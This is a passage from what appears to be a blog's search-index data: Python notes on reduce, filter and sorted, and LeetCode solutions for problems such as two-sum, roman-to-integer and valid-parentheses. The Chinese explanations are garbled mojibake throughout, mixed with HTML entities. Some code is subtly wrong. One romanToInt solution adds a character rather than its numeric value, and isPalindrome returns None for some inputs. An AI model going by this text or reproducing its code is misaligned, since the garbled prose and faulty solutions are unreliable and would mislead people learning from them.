&#x27;4&#x27;, &#x27;5&#x27;, &#x27;6&#x27;, &#x27;7&#x27;, &#x27;8&#x27;, &#x27;9&#x27;, &#x27;10&#x27;] Reduce Function Definition reduce()å‡½æ•°å’Œmap()ç›¸ä¼¼ï¼Œæ¥æ”¶ä¸¤ä¸ªå‚æ•°ï¼Œä¸€ä¸ªæ˜¯å‡½æ•°ï¼Œä¸€ä¸ªIterableã€‚ä¸åŒçš„æ˜¯ï¼Œreduce()æŠŠä¸€ä¸ªå‡½æ•°ä½œç”¨åœ¨ä¸€ä¸ªåºåˆ—[x1, x2, x3, ...]ä¸Šï¼Œå¹¶ä¸”è¿™ä¸ªå‡½æ•°å¿…é¡»æ¥æ”¶ä¸¤ä¸ªå‚æ•°ï¼Œreduce()æŠŠç»“æœç»§ç»­å’Œåºåˆ—çš„ä¸‹ä¸€ä¸ªå…ƒç´ åšç´¯ç§¯è®¡ç®—ï¼Œå½¢å¦‚ï¼š 1reduce(f, [x1, x2, x3, x4]) = f(f(f(x1, x2), x3), x4) Example 1234567891011121314&gt;&gt;&gt; from functools import reduce&gt;&gt;&gt; def fn(x, y):... return x*10 + y... &gt;&gt;&gt; reduce(fn, [1, 3, 5, 7, 9])13579# é…åˆmap()ï¼Œæˆ‘ä»¬å°±å¯ä»¥å†™å‡ºæŠŠstrè½¬æ¢ä¸ºintçš„å‡½æ•°&gt;&gt;&gt; def char2nums(s):... digits = &#123;&#x27;0&#x27;: 0, &#x27;1&#x27;: 1, &#x27;2&#x27;: 2, &#x27;3&#x27;: 3, &#x27;4&#x27;: 4, &#x27;5&#x27;: 5, &#x27;6&#x27;: 6, &#x27;7&#x27;: 7, &#x27;8&#x27;: 8, &#x27;9&#x27;: 9&#125;... return digits[s]... &gt;&gt;&gt; reduce(fn, map(char2nums, &#x27;1234&#x27;))1234 ä½¿ç”¨lambdaè¡¨è¾¾å¼å¯ä»¥è¿›ä¸€æ­¥åŒ–ç®€ï¼š 123456789from functools import reduceDIGITS = &#123;&#x27;0&#x27;: 0, &#x27;1&#x27;: 1, &#x27;2&#x27;: 2, &#x27;3&#x27;: 3, &#x27;4&#x27;: 4, &#x27;5&#x27;: 5, &#x27;6&#x27;: 6, &#x27;7&#x27;: 7, &#x27;8&#x27;: 8, &#x27;9&#x27;: 9&#125;def char2num(s): return DIGITS[s]def str2int(s): return reduce(lambda x, y: x * 10 + y, map(char2num, s)) Exercise åˆ©ç”¨mapå’Œreduceç¼–å†™ä¸€ä¸ªstr2floatå‡½æ•°ï¼ŒæŠŠå­—ç¬¦ä¸²'123.456'è½¬æ¢æˆæµ®ç‚¹æ•°123.456ï¼š 123456789101112def f(dig): dict = &#123;&#x27;0&#x27;:0, &#x27;1&#x27;:1, &#x27;2&#x27;:2, &#x27;3&#x27;:3, &#x27;4&#x27;:4, &#x27;5&#x27;:5, &#x27;6&#x27;:6, &#x27;7&#x27;:7, &#x27;8&#x27;:8, &#x27;9&#x27;:9&#125; return dict[dig]def g(x, y): return x*10+ydef h(a, b): return (a/10+b)def str2float(s): return reduce(g, map(f,s[:s.find(&#x27;.&#x27;)])) + reduce(h, map(f, s[-1:-(len(s)-s.find(&#x27;.&#x27;)):-1]))/10 Filter Function Definition å’Œmap()ç±»ä¼¼ï¼Œfilter()ä¹Ÿæ¥æ”¶ä¸€ä¸ªå‡½æ•°å’Œä¸€ä¸ªåºåˆ—ã€‚å’Œmap()ä¸åŒçš„æ˜¯ï¼Œfilter()æŠŠä¼ å…¥çš„å‡½æ•°ä¾æ¬¡ä½œç”¨äºæ¯ä¸ªå…ƒç´ ï¼Œç„¶åæ ¹æ®è¿”å›å€¼æ˜¯Trueè¿˜æ˜¯Falseå†³å®šä¿ç•™è¿˜æ˜¯ä¸¢å¼ƒè¯¥å…ƒç´ ã€‚filter()å‡½æ•°è¿”å›çš„æ˜¯ä¸€ä¸ªIteratorï¼Œä¹Ÿå°±æ˜¯ä¸€ä¸ªæƒ°æ€§åºåˆ—ã€‚ Example åœ¨ä¸€ä¸ªlistä¸­ï¼Œåˆ æ‰å¶æ•°ï¼Œåªä¿ç•™å¥‡æ•°ï¼š 1234def is_odd(n): return n % 2list(filter(is_odd, [1, 2, 3, 4, 5, 6, 7])) æŠŠä¸€ä¸ªåºåˆ—ä¸­çš„ç©ºå­—ç¬¦ä¸²åˆ æ‰ï¼š 1234def not_empty(s): return s and s.strip()list(filter(not_empty, [&#x27;A&#x27;, &#x27;&#x27;, &#x27;B&#x27;, None, &#x27;C&#x27;, &#x27; &#x27;])) Exercise å›æ•°æ˜¯æŒ‡ä»å·¦å‘å³è¯»å’Œä»å³å‘å·¦è¯»éƒ½æ˜¯ä¸€æ ·çš„æ•°ï¼Œä¾‹å¦‚12321ï¼Œ909ã€‚è¯·åˆ©ç”¨filter()ç­›é€‰å‡ºå›æ•°ï¼š 1234def is_palindrome(n): return str(n)==str(n)[::-1]output = filter(is_palindrome, range(1, 1000)) Sorted Function Definition sorted()å‡½æ•°é™¤äº†å¯ä»¥å¯¹listè¿›è¡Œæ’åºä¹‹å¤–ï¼Œå®ƒè¿˜å¯ä»¥æ¥æ”¶ä¸€ä¸ªkeyå‡½æ•°æ¥å®ç°è‡ªå®šä¹‰æ’åºã€‚ Example 12&gt;&gt;&gt; sorted([36, 5, -12, 9, -21])[-21, -12, 5, 9, 36] 12&gt;&gt;&gt; sorted([36, 5, -12, 9, -21], key=abs)[5, 9, -12, -21, 36]","tags":[{"name":"python","slug":"python","permalink":"http://ca0y1h.top/tags/python/"},{"name":"å‡½æ•°å¼ç¼–ç¨‹","slug":"å‡½æ•°å¼ç¼–ç¨‹","permalink":"http://ca0y1h.top/tags/%E5%87%BD%E6%95%B0%E5%BC%8F%E7%BC%96%E7%A8%8B/"}],"categories":[{"name":"ç¼–ç¨‹","slug":"ç¼–ç¨‹","permalink":"http://ca0y1h.top/categories/%E7%BC%96%E7%A8%8B/"},{"name":"python","slug":"ç¼–ç¨‹/python","permalink":"http://ca0y1h.top/categories/%E7%BC%96%E7%A8%8B/python/"}]},{"title":"Leetcode_Primary-class","date":"2019-09-08T05:57:51.000Z","path":"Algorithm/1.Leetcode-Primary-class/","text":"Leetcode Primary Class #1 two-sum ä¸¤æ•°ä¹‹å’Œ Question ç»™å®šä¸€ä¸ªæ•´æ•°æ•°ç»„ nums å’Œä¸€ä¸ªç›®æ ‡å€¼ targetï¼Œè¯·ä½ åœ¨è¯¥æ•°ç»„ä¸­æ‰¾å‡ºå’Œä¸ºç›®æ ‡å€¼çš„é‚£ä¸¤ä¸ªæ•´æ•°ï¼Œå¹¶è¿”å›ä»–ä»¬çš„æ•°ç»„ä¸‹æ ‡ã€‚ ä½ å¯ä»¥å‡è®¾æ¯ç§è¾“å…¥åªä¼šå¯¹åº”ä¸€ä¸ªç­”æ¡ˆã€‚ä½†æ˜¯ï¼Œä½ ä¸èƒ½é‡å¤åˆ©ç”¨è¿™ä¸ªæ•°ç»„ä¸­åŒæ ·çš„å…ƒç´ ã€‚ Example 1234ç»™å®š nums &#x3D; [2, 7, 11, 15], target &#x3D; 9å› ä¸º nums[0] + nums[1] &#x3D; 2 + 7 &#x3D; 9æ‰€ä»¥è¿”å› [0, 1] Solution æ–¹æ³•ä¸€ 123456789101112131415class Solution(object): def twoSum(self, nums, target): &quot;&quot;&quot; :type nums: List[int] :type target: int :rtype: List[int] &quot;&quot;&quot; for index, value in enumerate(nums): left = target-value if left in nums[(index+1):]: left_index = nums.index(left) if index == left_index: left_index = left_index + nums[left_index+1:].index(left) + 1 return [index, left_index] return [] æ–¹æ³•äºŒ å‚è€ƒäº†å¤§ç¥ä»¬çš„è§£æ³•ï¼Œé€šè¿‡å“ˆå¸Œæ¥æ±‚è§£ï¼Œè¿™é‡Œé€šè¿‡å­—å…¸æ¥æ¨¡æ‹Ÿå“ˆå¸ŒæŸ¥è¯¢çš„è¿‡ç¨‹ã€‚ ä¸ªäººç†è§£è¿™ç§åŠæ³•ç›¸è¾ƒäºæ–¹æ³•ä¸€å…¶å®å°±æ˜¯å­—å…¸è®°å½•äº† num1 å’Œ num2 çš„å€¼å’Œä½ç½®ï¼Œè€Œçœäº†å†æŸ¥æ‰¾ num2 ç´¢å¼•çš„æ­¥éª¤ã€‚ 1234567891011121314class Solution(object): def twoSum(self, nums, target): &quot;&quot;&quot; :type nums: List[int] :type target: int :rtype: List[int] &quot;&quot;&quot; hashmap = &#123;&#125; for key, value in enumerate(nums): hashmap[value] = key for i, num in enumerate(nums): j = hashmap.get(target - num) if j is not None and j != i: return [i, j] #7 reverse-integer æ•´æ•°åè½¬ Question ç»™å‡ºä¸€ä¸ª 32 ä½çš„æœ‰ç¬¦å·æ•´æ•°ï¼Œä½ éœ€è¦å°†è¿™ä¸ªæ•´æ•°ä¸­æ¯ä½ä¸Šçš„æ•°å­—è¿›è¡Œåè½¬ã€‚ æ³¨æ„: å‡è®¾æˆ‘ä»¬çš„ç¯å¢ƒåªèƒ½å­˜å‚¨å¾—ä¸‹ 32 ä½çš„æœ‰ç¬¦å·æ•´æ•°ï¼Œåˆ™å…¶æ•°å€¼èŒƒå›´ä¸º [âˆ’231, 231 âˆ’ 1]ã€‚è¯·æ ¹æ®è¿™ä¸ªå‡è®¾ï¼Œå¦‚æœåè½¬åæ•´æ•°æº¢å‡ºé‚£ä¹ˆå°±è¿”å› 0ã€‚ Example ç¤ºä¾‹ 1: 12è¾“å…¥: 123è¾“å‡º: 321 ç¤ºä¾‹ 2: 12è¾“å…¥: -123è¾“å‡º: -321 ç¤ºä¾‹ 3: 12è¾“å…¥: 120è¾“å‡º: 21 Solution æ–¹æ³•ä¸€ é¦–å…ˆæƒ³åˆ°çš„è‚¯å®šæ˜¯å°†intç±»å‹è½¬æ¢æˆstrç±»å‹ï¼Œé€†ç½®åå†è½¬æ¢æˆintç±»å‹ã€‚ 12345678910111213141516class Solution(object): def reverse(self, x): &quot;&quot;&quot; :type x: int :rtype: int &quot;&quot;&quot; if x &gt; 0: x = int(str(x)[::-1]) else: x= int(&#x27;-&#x27; + str(abs(x))[::-1]) if x &lt; 2**31 and x &gt; -2**31: return x else: return 0 è¿™ä¸ªä»£ç æœ€å·§å¦™çš„åœ°æ–¹å°±åœ¨äºä½¿ç”¨äº†åˆ‡ç‰‡è¿™ç§ç‰¹æ€§æ¥ç›´æ¥é€†ç½®å­—ç¬¦ä¸²ã€‚ æ–¹æ³•äºŒ æˆ‘ä»¬æƒ³é‡å¤â€œå¼¹å‡ºâ€ xçš„æœ€åä¸€ä½æ•°å­—ï¼Œå¹¶å°†å®ƒâ€œæ¨å…¥â€åˆ° rev çš„åé¢ã€‚æœ€åï¼Œrev å°†ä¸ xç›¸åã€‚ è¦åœ¨æ²¡æœ‰è¾…åŠ©å †æ ˆ / æ•°ç»„çš„å¸®åŠ©ä¸‹ â€œå¼¹å‡ºâ€ å’Œ â€œæ¨å…¥â€ æ•°å­—ï¼Œæˆ‘ä»¬å¯ä»¥ä½¿ç”¨æ•°å­¦æ–¹æ³•ã€‚ 1234567//pop operation:pop = x % 10;x /= 10;//push operation:temp = rev * 10 + pop;rev = temp; Extra æ•°å€¼äº¤æ¢ï¼šx, y = y, x int to listï¼šl = [int(x) for x in str(num)] list to intï¼š ä½¿ç”¨åˆ—è¡¨ç”Ÿæˆå™¨ï¼š 12s = [str(i) for i in list]res = int(&#x27;&#x27;.join(s)) ä½¿ç”¨mapå‡½æ•°ï¼šres = int(''.join(map(str, list))) #9 palindrome-number å›æ–‡æ•° Question åˆ¤æ–­ä¸€ä¸ªæ•´æ•°æ˜¯å¦æ˜¯å›æ–‡æ•°ã€‚å›æ–‡æ•°æ˜¯æŒ‡æ­£åºï¼ˆä»å·¦å‘å³ï¼‰å’Œå€’åºï¼ˆä»å³å‘å·¦ï¼‰è¯»éƒ½æ˜¯ä¸€æ ·çš„æ•´æ•°ã€‚ Example ç¤ºä¾‹ 1: 123è¾“å…¥: 121è¾“å‡º: trueç¤ºä¾‹ 2: ç¤ºä¾‹2ï¼š 123è¾“å…¥: -121è¾“å‡º: falseè§£é‡Š: ä»å·¦å‘å³è¯», ä¸º -121 ã€‚ ä»å³å‘å·¦è¯», ä¸º 121- ã€‚å› æ­¤å®ƒä¸æ˜¯ä¸€ä¸ªå›æ–‡æ•°ã€‚ ç¤ºä¾‹3ï¼š 123è¾“å…¥: 10è¾“å‡º: falseè§£é‡Š: ä»å³å‘å·¦è¯», ä¸º 01 ã€‚å› æ­¤å®ƒä¸æ˜¯ä¸€ä¸ªå›æ–‡æ•°ã€‚ Solution 1234567891011121314class Solution(object): def isPalindrome(self, x): &quot;&quot;&quot; :type x: int :rtype: bool &quot;&quot;&quot; if x &gt; 0: y = int(str(x)[::-1]) if x == y: return True elif x == 0: return True else: return False #13_roman-to-integer ç½—é©¬æ•°å­—è½¬æ•´æ•° Question ç½—é©¬æ•°å­—åŒ…å«ä»¥ä¸‹ä¸ƒç§å­—ç¬¦: Iï¼Œ Vï¼Œ Xï¼Œ Lï¼ŒCï¼ŒD å’Œ Mã€‚ å­—ç¬¦ æ•°å€¼ I 1 V 5 X 10 L 50 C 100 D 500 M 1000 ä¾‹å¦‚ï¼Œ ç½—é©¬æ•°å­— 2 å†™åš II ï¼Œå³ä¸ºä¸¤ä¸ªå¹¶åˆ—çš„ 1ã€‚12 å†™åš XII ï¼Œå³ä¸º X + II ã€‚ 27 å†™åš XXVII, å³ä¸º XX + V + II ã€‚ é€šå¸¸æƒ…å†µä¸‹ï¼Œç½—é©¬æ•°å­—ä¸­å°çš„æ•°å­—åœ¨å¤§çš„æ•°å­—çš„å³è¾¹ã€‚ä½†ä¹Ÿå­˜åœ¨ç‰¹ä¾‹ï¼Œä¾‹å¦‚ 4 ä¸å†™åš IIIIï¼Œè€Œæ˜¯ IVã€‚æ•°å­— 1 åœ¨æ•°å­— 5 çš„å·¦è¾¹ï¼Œæ‰€è¡¨ç¤ºçš„æ•°ç­‰äºå¤§æ•° 5 å‡å°æ•° 1 å¾—åˆ°çš„æ•°å€¼ 4 ã€‚åŒæ ·åœ°ï¼Œæ•°å­— 9 è¡¨ç¤ºä¸º IXã€‚è¿™ä¸ªç‰¹æ®Šçš„è§„åˆ™åªé€‚ç”¨äºä»¥ä¸‹å…­ç§æƒ…å†µï¼š I å¯ä»¥æ”¾åœ¨ V (5) å’Œ X (10) çš„å·¦è¾¹ï¼Œæ¥è¡¨ç¤º 4 å’Œ 9ã€‚ X å¯ä»¥æ”¾åœ¨ L (50) å’Œ C (100) çš„å·¦è¾¹ï¼Œæ¥è¡¨ç¤º 40 å’Œ 90ã€‚ C å¯ä»¥æ”¾åœ¨ D (500) å’Œ M (1000) çš„å·¦è¾¹ï¼Œæ¥è¡¨ç¤º 400 å’Œ 900ã€‚ ç»™å®šä¸€ä¸ªç½—é©¬æ•°å­—ï¼Œå°†å…¶è½¬æ¢æˆæ•´æ•°ã€‚è¾“å…¥ç¡®ä¿åœ¨ 1 åˆ° 3999 çš„èŒƒå›´å†…ã€‚ Example ç¤ºä¾‹ 1: 12è¾“å…¥: &quot;III&quot;è¾“å‡º: 3 ç¤ºä¾‹ 2: 12è¾“å…¥: &quot;IV&quot;è¾“å‡º: 4 ç¤ºä¾‹ 3: 12è¾“å…¥: &quot;IX&quot;è¾“å‡º: 9 ç¤ºä¾‹ 4: 123è¾“å…¥: &quot;LVIII&quot;è¾“å‡º: 58è§£é‡Š: L &#x3D; 50, V&#x3D; 5, III &#x3D; 3. ç¤ºä¾‹ 5: 123è¾“å…¥: &quot;MCMXCIV&quot;è¾“å‡º: 1994è§£é‡Š: M &#x3D; 1000, CM &#x3D; 900, XC &#x3D; 90, IV &#x3D; 4. Solution æ–¹æ³•ä¸€ æ€è·¯ï¼šä»å·¦å¾€å³ä¸€ä½ä¸€ä½çš„çœ‹ï¼Œå¦‚æœè¿™ä¸€ä½æ•°å­—æ¯”å®ƒå³è¾¹ä¸€ä½çš„æ•°å­—å¤§æˆ–ä¸å…¶ç›¸ç­‰ï¼Œåˆ™åŠ ä¸Šè¿™ä¸€ä½ä»£è¡¨çš„å€¼ï¼Œå¦‚æœå®ƒæ¯”å³è¾¹ä¸€ä½å°ï¼Œåˆ™å‡å»è¿™ä¸€ä½ä»£è¡¨çš„æ•°å­—ã€‚ ä¾‹å¦‚ï¼š â€˜MMCMLXIVâ€™: ç¬¬ä¸€ä½æ˜¯Mï¼Œå®ƒçš„åä¸€ä½ä¹Ÿæ˜¯Mï¼Œæ‰€ä»¥ num = 0 + 1000ï¼Œä¹‹å M &gt; C, num = num + 1000 =2000,ä¹‹ååˆ°ç‰¹æ®Šå€¼ï¼Œå› ä¸ºC&lt;Mï¼Œæ‰€ä»¥num=num-C =2000-100=1900,ä¹‹åå†åŠ ä¸Š1000å¾—åˆ° num=2900â€¦â€¦ä»¥æ­¤ç±»æ¨è¿›è¡Œä¸‹å»ï¼Œæœ€åå¯å¾—åˆ° num = 2964 éœ€è¦æ³¨æ„çš„æ˜¯ï¼Œä½ä¸åä¸€ä½çš„æ¯”è¾ƒåªéœ€è¿›è¡Œåˆ°å€’æ•°ç¬¬äºŒä½å³å¯ï¼Œå› ä¸ºæœ€åä¸€ä½æ²¡æœ‰æ¯”å®ƒå°çš„ä¸€ä½èƒ½å¤Ÿè¿›è¡Œæ¯”è¾ƒï¼Œç›´æ¥åŠ ä¸Šæœ€åä¸€ä½ä»£è¡¨çš„å€¼å³å¯ã€‚ åˆ¤æ–­åˆ°å€’æ•°ç¬¬äºŒä½æ—¶ï¼Œå¦‚æœæœ€åä¸€ä¸ªæ•°æ¯”å‰ä¸€ä¸ªæ•°å¤§ï¼Œç¨‹åºå°±ä¼šç›´æ¥å‡å»å€’æ•°ç¬¬äºŒä¸ªæ•°ï¼Œç„¶åç›´æ¥åŠ ä¸Šæœ€åä¸€ä¸ªæ•°å°±è¡Œäº†ã€‚æ‰€ä»¥æœ€åä¸€ä¸ªæ•°ä¸ç®¡æ¯”å‰é¢çš„æ•°å¤§è¿˜æ˜¯å°éƒ½ä¼šç›´æ¥åŠ ä¸Šå®ƒçš„å€¼ã€‚ 123456789101112131415161718class Solution(object): def romanToInt(self, s): &quot;&quot;&quot; :type s: str :rtype: int &quot;&quot;&quot; roman_dict = &#123;&#x27;M&#x27;: 1000, &#x27;D&#x27;: 500, &#x27;C&#x27;: 100, &#x27;L&#x27;: 50, &#x27;X&#x27;: 10, &#x27;V&#x27;: 5, &#x27;I&#x27;: 1&#125; sum = 0 for i in range(len(s) - 1): if roman_dict.get(s[i]) &gt;= roman_dict.get(s[i+1]): sum += roman_dict.get(s[i]) else: sum -= roman_dict.get(s[i]) last_num = s[len(s) - 1] sum += last_num return sum æ–¹æ³•äºŒ æ€è·¯ï¼š æ„å»ºä¸€ä¸ªå­—å…¸è®°å½•æ‰€æœ‰ç½—é©¬æ•°å­—å­ä¸²ï¼Œæ³¨æ„é•¿åº¦ä¸º2çš„å­ä¸²è®°å½•çš„å€¼æ˜¯**ï¼ˆå®é™…å€¼ - å­ä¸²å†…å·¦è¾¹ç½—é©¬æ•°å­—ä»£è¡¨çš„æ•°å€¼ï¼‰**ã€‚ è¿™æ ·ä¸€æ¥ï¼Œéå†æ•´ä¸ª s çš„æ—¶å€™åˆ¤æ–­å½“å‰ä½ç½®å’Œå‰ä¸€ä¸ªä½ç½®çš„ä¸¤ä¸ªå­—ç¬¦ç»„æˆçš„å­—ç¬¦ä¸²æ˜¯å¦åœ¨å­—å…¸å†…ï¼Œå¦‚æœåœ¨å°±è®°å½•å€¼ï¼Œä¸åœ¨å°±è¯´æ˜å½“å‰ä½ç½®ä¸å­˜åœ¨å°æ•°å­—åœ¨å‰é¢çš„æƒ…å†µï¼Œç›´æ¥è®°å½•å½“å‰ä½ç½®å­—ç¬¦å¯¹åº”å€¼ã€‚ 123456789class Solution(object): def romanToInt(self, s): &quot;&quot;&quot; :type s: str :rtype: int &quot;&quot;&quot; roman_dict = &#123;&#x27;M&#x27;: 1000, &#x27;D&#x27;: 500, &#x27;C&#x27;: 100, &#x27;L&#x27;: 50, &#x27;X&#x27;: 10, &#x27;V&#x27;: 5, &#x27;I&#x27;: 1, &#x27;IV&#x27;: 3, &#x27;IX&#x27;: 8, &#x27;XL&#x27;: 30, &#x27;XC&#x27;: 80, &#x27;CD&#x27;: 300, &#x27;CM&#x27;: 800&#125; return sum(roman_dict.get(s[max(i-1, 0): i+1], roman_dict[n]) for i, n in enumerate(s)) Extra sum(iterable, [start]) -&gt; number ç”Ÿæˆå™¨ï¼ˆgeneratorï¼‰ g = (x * x for x in range(10)) 1234567891011- å¦‚æœä¸€ä¸ªå‡½æ•°å®šä¹‰ä¸­åŒ…å«&#96;yield&#96;å…³é”®å­—ï¼Œé‚£ä¹ˆè¿™ä¸ªå‡½æ•°å°±ä¸å†æ˜¯ä¸€ä¸ªæ™®é€šå‡½æ•°ï¼Œè€Œæ˜¯ä¸€ä¸ªgeneratorï¼š &#96;&#96;&#96;python def fib(max): n, a, b &#x3D; 0, 0, 1 while n &lt; max: yield b a, b &#x3D; b, a + b n &#x3D; n + 1 return &#39;done&#39; #14 longest-common-prefix æœ€é•¿å…¬å…±å‰ç¼€ Question ç¼–å†™ä¸€ä¸ªå‡½æ•°æ¥æŸ¥æ‰¾å­—ç¬¦ä¸²æ•°ç»„ä¸­çš„æœ€é•¿å…¬å…±å‰ç¼€ã€‚ å¦‚æœä¸å­˜åœ¨å…¬å…±å‰ç¼€ï¼Œè¿”å›ç©ºå­—ç¬¦ä¸² &quot;&quot;ã€‚ æ‰€æœ‰è¾“å…¥åªåŒ…å«å°å†™å­—æ¯ a-z ã€‚ Example ç¤ºä¾‹1 12è¾“å…¥: [&quot;flower&quot;,&quot;flow&quot;,&quot;flight&quot;]è¾“å‡º: &quot;fl&quot; ç¤ºä¾‹2 123è¾“å…¥: [&quot;dog&quot;,&quot;racecar&quot;,&quot;car&quot;]è¾“å‡º: &quot;&quot;è§£é‡Š: è¾“å…¥ä¸å­˜åœ¨å…¬å…±å‰ç¼€ã€‚ Solutions æ–¹æ³•ä¸€ æ€è·¯ï¼š é¦–å…ˆæƒ³åˆ°åˆ—è¡¨ä¸ºç©ºçš„æƒ…å†µï¼Œè¿”å›ç©ºå­—ç¬¦ä¸²ã€‚ ç¬¬ä¸€ä¸ªå­—ç¬¦ä¸²çš„ç¬¬ä¸€ä½ä¸ç¬¬äºŒä¸ªå­—ç¬¦ä¸²çš„ç¬¬ä¸€ä½æ¯”è¾ƒï¼Œè‹¥ç›¸åŒåˆ™ç»§ç»­å°†ç¬¬äºŒä¸ªå­—ç¬¦ä¸²çš„ç¬¬ä¸€ä½å’Œç¬¬ä¸‰ä¸ªå­—ç¬¦ä¸²ç¬¬ä¸€ä½æ¯”è¾ƒï¼Œä¾æ¬¡ç±»æ¨ã€‚è‹¥æ¯”è¾ƒåˆ°ç¬¬jå’Œj+1ä¸ªå­—ç¬¦ä¸²çš„ç¬¬kä½ä¸åŒåˆ™è¿”å›ç¬¬ä¸€ä¸ªå­—ç¬¦ä¸²çš„å‰jä¸ªå­ä¸²ï¼ˆä¸åŒ…æ‹¬ç¬¬jä¸ªå­—ç¬¦ã€‚ è‹¥æœ€åæ‰€æœ‰å­—ç¬¦ä¸²éƒ½ç›¸åŒï¼Œåˆ™è¿”å›ç¬¬ä¸€ä¸ªå­—ç¬¦ä¸²é•¿åº¦ä¸ºstrsä¸­å…ƒç´ çš„é•¿åº¦æœ€å°çš„å­ä¸²ã€‚ 12345678910111213141516class Solution(object): def longestCommonPrefix(self, strs): &quot;&quot;&quot; :type strs: List[str] :rtype: str &quot;&quot;&quot; if len(strs) == 0: return &#x27;&#x27; min_len = min(list(map(len, [strs[i] for i in range(len(strs))]))) for j in range(min_len): for k in range(len(strs) - 1): if strs[k][j] != strs[k+1][j]: return strs[0][:j] return strs[0][:min_len] if min_len else &#x27;&#x27; æ–¹æ³•äºŒ æ€è·¯ï¼š åˆ©ç”¨zipå‡½æ•°è§£åŒ…ä»¥åŠsetåˆ¤æ–­æ˜¯å¦ç›¸åŒï¼Œæ¥å¯¹æ¯ä¸€ä¸ªå•è¯çš„åŒä¸€ä½ç½®çš„å­—æ¯è¿›è¡Œæ¯”è¾ƒ 1234567891011121314class Solution: def longestCommonPrefix(self, strs): &quot;&quot;&quot; :type strs: List[str] :rtype: str &quot;&quot;&quot; res = &quot;&quot; for tmp in zip(*strs): tmp_set = set(tmp) if len(tmp_set) == 1: res += tmp[0] else: break return res Extra *è§£åŒ…æ“ä½œï¼š 1234567891011&gt;&gt;&gt; def func(a,b,c):... print(a,b,c)&gt;&gt;&gt; func(*[1,2,3])1 2 3&gt;&gt;&gt; func(*(1,2,3))1 2 3&gt;&gt;&gt; func(*&quot;abc&quot;)a b c&gt;&gt;&gt; func(*&#123;&quot;a&quot;:1,&quot;b&quot;:2,&quot;c&quot;:3&#125;)a b c zip()å‡½æ•° æŠŠä¸¤ä¸ªæˆ–å¤šä¸ªæ•°ç»„çš„æ‰€æœ‰å…ƒç´ æŒ‰ç´¢å¼•å¯¹é½ï¼Œç„¶åæŒ‰ç´¢å¼•åˆå¹¶æˆæ–°æ•°ç»„ã€‚ setä¸­ä¸å…è®¸æœ‰é‡å¤çš„å…ƒç´ å­˜åœ¨ã€‚ #20 valid-parentheses æœ‰æ•ˆæ‹¬å· Question ç»™å®šä¸€ä¸ªåªåŒ…æ‹¬ â€˜(â€™ï¼Œâ€™)â€™ï¼Œâ€™{â€™ï¼Œâ€™}â€™ï¼Œâ€™[â€™ï¼Œâ€™]â€™ çš„å­—ç¬¦ä¸²ï¼Œåˆ¤æ–­å­—ç¬¦ä¸²æ˜¯å¦æœ‰æ•ˆã€‚ æœ‰æ•ˆå­—ç¬¦ä¸²éœ€æ»¡è¶³ï¼š å·¦æ‹¬å·å¿…é¡»ç”¨ç›¸åŒç±»å‹çš„å³æ‹¬å·é—­åˆã€‚ å·¦æ‹¬å·å¿…é¡»ä»¥æ­£ç¡®çš„é¡ºåºé—­åˆã€‚ æ³¨æ„ç©ºå­—ç¬¦ä¸²å¯è¢«è®¤ä¸ºæ˜¯æœ‰æ•ˆå­—ç¬¦ä¸²ã€‚ Example ç¤ºä¾‹1 12è¾“å…¥: &quot;()&quot;è¾“å‡º: true ç¤ºä¾‹2 12è¾“å…¥: &quot;()[]&#123;&#125;&quot;è¾“å‡º: true ç¤ºä¾‹3 12è¾“å…¥: &quot;(]&quot;è¾“å‡º: false ç¤ºä¾‹4 12è¾“å…¥: &quot;([)]&quot;è¾“å‡º: false ç¤ºä¾‹5 12è¾“å…¥: &quot;&#123;[]&#125;&quot;è¾“å‡º: true Solution æ–¹æ³•ä¸€ æ€è·¯ é¦–å…ˆç©ºå­—ç¬¦ä¸²è¿”å›True æ ˆå…ˆå…¥åå‡ºç‰¹ç‚¹æ°å¥½ä¸æœ¬é¢˜æ‹¬å·æ’åºç‰¹ç‚¹ä¸€è‡´ï¼Œå³è‹¥é‡åˆ°å·¦æ‹¬å·å…¥æ ˆï¼Œé‡åˆ°å³æ‹¬å·æ—¶å°†å¯¹åº”æ ˆé¡¶å·¦æ‹¬å·å‡ºæ ˆï¼Œåˆ™éå†å®Œæ‰€æœ‰æ‹¬å·å stack ä»ç„¶ä¸ºç©ºï¼› éœ€è¦æ³¨æ„çš„æ˜¯è‹¥æ ˆä¸ºç©ºï¼Œä¸”æ­¤æ—¶è¯»å–åˆ°çš„å­—ç¬¦æ˜¯right_parï¼Œåˆ™ç›´æ¥è¿”å›False 1234567891011121314151617181920212223242526272829class Solution(object): def isValid(self, s): &quot;&quot;&quot; :type s: str :rtype: bool &quot;&quot;&quot; if s == &#x27;&#x27;: return True left_par = [&#x27;(&#x27;, &#x27;[&#x27;, &#x27;&#123;&#x27;] right_par = [&#x27;)&#x27;, &#x27;]&#x27;, &#x27;&#125;&#x27;] if s[0] in right_par: return False l = [] for i in range(len(s)): if s[i] in left_par: l.append(s[i]) elif l == [] and s[i] in right_par: return False else: if left_par.index(l.pop(-1)) != right_par.index(s[i]): return False if l == []: return True else: return False æ–¹æ³•äºŒ â€‹ å…¶å®æ€è·¯æ˜¯ä¸€æ ·çš„ï¼Œå…³é”®æ˜¯ç”¨å­—å…¸æ¥æ›¿æ¢æ–¹æ³•ä¸€çš„ä¸¤ä¸ªåˆå§‹åˆ—è¡¨ 12345678class Solution: def isValid(self, s: str) -&gt; bool: dic = &#123;&#x27;&#123;&#x27;: &#x27;&#125;&#x27;, &#x27;[&#x27;: &#x27;]&#x27;, &#x27;(&#x27;: &#x27;)&#x27;, &#x27;?&#x27;: &#x27;?&#x27;&#125; stack = [&#x27;?&#x27;] for c in s: if c in dic: stack.append(c) elif dic[stack.pop()] != c: return False return len(stack) == 1 è§£æ stackåˆå§‹åŒ–çš„æ—¶å€™ä¸ºä»€ä¹ˆè¦åŠ ä¸€ä¸ª? æ ˆ stack ä¸ºç©ºæ—¶ï¼Œ stack.pop() æ“ä½œä¼šæŠ¥é”™ï¼›å› æ­¤ï¼Œæˆ‘ä»¬é‡‡ç”¨ä¸€ä¸ªå–å·§æ–¹æ³•ï¼Œç»™ stack èµ‹åˆå€¼ ?ï¼Œå¹¶åœ¨å“ˆå¸Œè¡¨ dicä¸­å»ºç«‹ key: '?'ï¼Œvalue:'?'keyçš„å¯¹åº”å…³ç³»äºˆä»¥é…åˆã€‚æ­¤æ—¶å½“ stack ä¸ºç©ºä¸” c ä¸ºå³æ‹¬å·æ—¶ï¼Œå¯ä»¥æ­£å¸¸æå‰è¿”å› falseã€‚ Extra Pythonæ¨¡æ‹Ÿæ ˆçš„æ“ä½œ å‹æ ˆï¼šlist.append() å‡ºæ ˆï¼šlist.pop() range([start,] 